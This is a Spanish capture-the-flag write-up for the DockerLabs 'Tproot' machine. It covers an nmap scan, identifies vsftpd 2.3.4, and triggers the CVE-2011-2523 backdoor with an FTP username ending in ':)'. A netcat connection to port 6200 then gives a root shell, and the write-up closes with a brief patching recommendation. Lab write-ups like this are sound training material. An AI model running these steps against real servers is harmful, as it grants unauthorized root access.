# Writeup: Tproot

- **Máquina:** Tproot (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/66/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 28 de Octubre 2026

---

## Objetivo
Explotar la backdoor de vsftpd 2.3.4 y obtener acceso como `root`.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh tproot.tar
```
<img width="576" height="360" alt="Captura de pantalla (273)" src="https://github.com/user-attachments/assets/b0f2c062-c699-4a3f-99b2-4e922598b0d6" />

Para comprobar que el server este activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.119 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.069 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.071 ms
3 packets transmitted, 3 received, 0% packet loss, time 2247ms
```

---

## 1. Reconocimiento
Se utilizó `nmap` para el escaneo de puertos. Esto reveló dos puertos abiertos:

```bash
$ nmap -p- -sCV 172.17.0.2 -o scantproot.txt
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```
---

## 2. Identificación de vulnerabilidades
La versión **vsftpd 2.3.4** puede ser comprometida al ingresar los caracteres `:)` en el nombre de usuario al momento de hacer el login FTP. Esto abre una backdoor en el puerto 6200 con posible acceso a privilegios `root`.

---
## 3. Explotación
### 1. Activar backdoor con FTP
El nombre **user:)** contiene los caracteres necesarios para la activación, introducimos cualquier contraseña y enviamos. 
```bash
$ ftp 172.17.0.2
```
<img width="313" height="101" alt="Captura de pantalla (293)" src="https://github.com/user-attachments/assets/008d1edc-d727-4cb7-bb66-dc5f45612115" />


### 2. Conectarse a la Shell
Una vez activa la backdoor, el puerto 6200 queda abierto con una shell `root`. Se utilizó `netcat` en una nueva terminal para acceder a ella:
```bash
$ nc 172.17.0.2 6200
```

<img width="158" height="50" alt="Captura de pantalla (295)" src="https://github.com/user-attachments/assets/5bc23b0e-22c3-4842-9d8c-c8b1d249c24d" />


---
## Acciones de mitigación
- **Exploit de versión vsftpd 2.3.4 (CVE-2011-2523)**: mantener todos los servicios y herramientas utilizados actualizados a su última versión.
